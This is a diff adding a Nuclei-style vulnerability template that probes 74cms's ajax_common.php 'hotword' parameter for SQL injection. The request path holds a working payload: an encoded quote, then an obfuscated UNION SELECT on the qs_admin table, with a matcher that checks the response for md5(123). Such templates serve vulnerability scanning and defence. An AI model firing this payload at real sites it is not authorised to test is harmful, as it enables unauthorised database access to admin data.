@@ -1,0 +1,25 @@
+id: 74cms-AjaxCommon-sqli
+
+info:
+  name: 74cms-ajax.common.php-sql1
+  author: str1am
+  severity: high
+  reference:
+    - http://www.2cto.com/article/201405/304552.html
+  tags: 74cms,sqli
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(123),3+from+qs_admin%23--"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        condition: and
+
+      - type: status
+        status:
+          - 200
